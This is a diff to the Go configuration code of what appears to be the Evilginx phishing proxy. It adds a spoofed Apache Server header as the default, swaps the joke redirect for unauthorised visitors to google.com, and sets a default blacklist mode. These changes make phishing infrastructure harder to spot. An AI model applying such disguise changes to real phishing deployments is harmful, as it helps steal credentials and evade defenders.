@@ -39,6 +39,7 @@ type SubPhishlet struct {
 type PhishletConfig struct {
 	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
 	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	ServerHeader string `mapstructure:"server_header" json:"server_header" yaml:"server_header"`
 	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
 	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
 }
@@ -53,9 +54,8 @@ type ProxyConfig struct {
 }
 
 type BlacklistConfig struct {
-	Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
+        Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
 }
-
 type CertificatesConfig struct {
 }
 
@@ -66,16 +66,16 @@ type GoPhishConfig struct {
 }
 
 type GeneralConfig struct {
-	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
-	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
-	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
-	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
-	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+        Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
+        OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+        ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+        BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+        UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+        ServerHeader string `mapstructure:"server_header" json:"server_header" yaml:"server_header"`
+        HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+        DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+        Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
 }
-
 type Config struct {
 	general         *GeneralConfig
 	certificates    *CertificatesConfig
@@ -104,7 +104,7 @@ const (
 	CFG_GOPHISH      = "gophish"
 )
 
-const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
+const DEFAULT_UNAUTH_URL = "https://www.google.com"
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c := &Config{
@@ -120,6 +120,8 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 
 	c.cfg = viper.New()
 	c.cfg.SetConfigType("json")
+	c.cfg.SetDefault("blacklist.mode", "unauth")
+	c.cfg.SetDefault("general.server_header", "Apache/2.4.41 (Ubuntu)")
 
 	if path == "" {
 		path = filepath.Join(cfg_dir, "config.json")
